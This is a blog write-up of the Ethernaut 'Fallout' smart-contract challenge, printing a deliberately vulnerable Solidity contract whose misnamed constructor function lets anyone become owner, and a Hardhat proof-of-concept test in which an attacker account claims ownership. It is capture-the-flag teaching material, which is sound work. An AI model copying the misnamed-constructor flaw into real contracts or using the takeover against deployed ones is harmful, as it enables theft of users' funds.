#Overview
I recently launched a blog post series where I will be posting about my journey in Web3/Blockchain security.
During this series, I will be posting about Web3/Blockchain bugs and exploits, alongside writeups for [Ethernaut](https://ethernaut.openzeppelin.com/) and [Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/) challenges.

You can check [the second 'Fallback' Ethernaut challenge here.](https://fouedsaidi.com/2025/12/22/Ethernaut-Fallback/)

Today, I am following up on the Ethernaut challenges series presented to us by [OpenZeppelin](https://www.openzeppelin.com/) !

Hope you enjoy it and learn something new!

# 'Fallout' Challenge

## Overview


`Fallout` is the third challenge in [the Ethernaut](https://ethernaut.openzeppelin.com/) series.


[Link to the original challenge.](https://ethernaut.openzeppelin.com/level/2)

[Github repo link that contains challenge code and solver.](https://github.com/kujen5/Ethernaut-Solutions/tree/main/Fallout)

## Challenge Description

```
Claim ownership of the contract below to complete this level.

  Things that might help

- Solidity Remix IDE
```

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

## Understanding the contract

Instead of solving the challenge on the browser using developer tools, I just want to do it locally this time by compiling the smart contract and interacting with it directly through unit tests. Which is the same as interacting with it on-chain.

1. First, we notice that we are using solidity cersion 0.6.0 which is compatible with SafeMath.

2. In older solidity versions, specifically before 0.4.22, a constructor naming convention was to utilize a function having the same name as the contract for constructing the contract. In our case, since we are using 0.6.0, any function having the same name as the contract will be ignored, and only an explicit `constructor` will be utilized.

3. A user can allocate (donate) to the contract using the `allocate()` function which increases his share of allocations:

```javascript
function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }
```

4. A user can also send his allocations (withdraw) by invoking the `sendAllocation()` function:

```javascript
function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }
```

5. The owner of the contract has the ability to withdraw all funds from the contract:

```javascript
function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }
```

## Point of Failure

- Since we are on solidity 0.6.0, and as we explained above that the constructor name matching the contract name is ignored in solidity versions that came after 0.4.22, we can conclude that the `function Fal1out()` is misname, first by using `l1` instead of `ll` and second by that its naming convention should not be that way.

# Exploitation

We have 1 objective out of this challenge: `to become owner`

## Exploitation Steps

The only function that modifies the owner of the conract is `function Fal1out()`, and as we explained earlier, it is not viewed nor used as a contructor. So anyone can basically just call it:

```javascript
function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }
```

1. First, we will create our attacker and give him some ETH:

```javascript
const [deployer, attacker] = await ethers.getSigners();
    await networkHelpers.setBalance(
      attacker.address,
      ethers.parseEther("1")
    );
```

2. Then we can simply call the `Fal1out` function that will make us owner:

```javascript
const falloutAsAttacker = fallout.connect(attacker);
const tx = await falloutAsAttacker.Fal1out({ value: ethers.parseEther("0.0001") ,});
await tx.wait();
```

## Exploit test case

You can find below the full Proof of Concept:

```javascript
import { expect } from "chai";
import hre from "hardhat";
import hardhatNetworkHelpers from "@nomicfoundation/hardhat-network-helpers";

const { ethers, networkHelpers } = await hre.network.connect();

describe("Fallout Test", function () {
  it("Fallout block", async () => {
    // setup users
    const [deployer, attacker] = await ethers.getSigners();
    await networkHelpers.setBalance(
      attacker.address,
      ethers.parseEther("1")
    );

    // deploy contract
    const Fallout = await ethers.getContractFactory("Fallout", deployer);
    const fallout = await Fallout.deploy();
    await fallout.waitForDeployment();

    console.log("Owner upon deployment: ",await fallout.owner());

    
    // call Fal1out function
    const falloutAsAttacker = fallout.connect(attacker);
    const tx = await falloutAsAttacker.Fal1out({ value: ethers.parseEther("0.0001") ,});
    await tx.wait();

    console.log("Owner after Fal1out invocation: ",await fallout.owner());

    // verify the attacker is now the owner
    expect(await fallout.owner()).to.equal(attacker.address);
  });
});

```

And below is the output showcasing our successful exploitation:

```bash
$ npx hardhat test
No contracts to compile
No Solidity tests to compile

Running Solidity tests


Running Mocha tests


  Fallout Test
Owner upon deployment:  0x0000000000000000000000000000000000000000
Owner after Fal1out invocation:  0x70997970C51812dc3A010C7d01b50e0d17dc79C8
    ✔ Fallout block (59ms)


  1 passing (61ms)


1 passing (1 mocha)
```

# Conclusion

We can conclude from what we have seen that confusing different implementation between different solidity versions and not being attentive with our naming conventions can be very dangerous in allowing users to manipulate contract invariants.

That was it for `Fallout` challenge from Ethernaut series.

You can find through [this github link the repository that contains my solver](https://github.com/kujen5/Ethernaut-Solutions/tree/main/Fallout)  and all the future Ethernaut solutions Inshallah!

See you next time~

